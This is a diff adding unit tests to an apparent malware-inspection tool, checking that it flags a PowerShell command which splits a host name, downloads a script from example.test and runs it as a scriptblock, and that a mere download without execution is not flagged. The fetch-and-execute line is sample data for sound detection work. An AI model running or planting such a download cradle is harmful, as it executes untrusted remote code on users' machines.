@@ -182,6 +182,43 @@ class StaticInspectionTests(unittest.TestCase):
         self.assertIn("defender-exclusion", kinds)
         self.assertIn("encoded-powershell", kinds)
 
+    def test_split_host_downloadstring_scriptblock_execution_is_reported(self):
+        source = (
+            "$Node='example.'; $Zone='test'; $Path='/setup.ps1'; "
+            "$Endpoint='https://'+$Node+$Zone+$Path; "
+            "$Client=New-Object System.Net.WebClient; "
+            "$Buffer=$Client.DownloadString($Endpoint); "
+            ".([scriptblock]::Create($Buffer))"
+        )
+        with tempfile.TemporaryDirectory() as directory:
+            root = Path(directory)
+            (root / "README.md").write_text(source, encoding="utf-8")
+            result = inspect_tree(root, indicators={"indicators": []})
+
+        finding = next(
+            item
+            for item in result["findings"]
+            if item["kind"] == "powershell-download-scriptblock-execute"
+        )
+        self.assertEqual(finding["path"], "README.md")
+        self.assertEqual(finding["severity"], "high")
+
+    def test_downloadstring_without_execution_is_not_reported(self):
+        source = (
+            "$Client=New-Object System.Net.WebClient; "
+            "$Buffer=$Client.DownloadString('https://example.test/setup.ps1'); "
+            "Set-Content -Path preview.txt -Value $Buffer"
+        )
+        with tempfile.TemporaryDirectory() as directory:
+            root = Path(directory)
+            (root / "inspect.ps1").write_text(source, encoding="utf-8")
+            result = inspect_tree(root, indicators={"indicators": []})
+
+        self.assertNotIn(
+            "powershell-download-scriptblock-execute",
+            {item["kind"] for item in result["findings"]},
+        )
+
     def test_small_text_inside_zip_is_inspected_without_extraction(self):
         with tempfile.TemporaryDirectory() as directory:
             root = Path(directory)
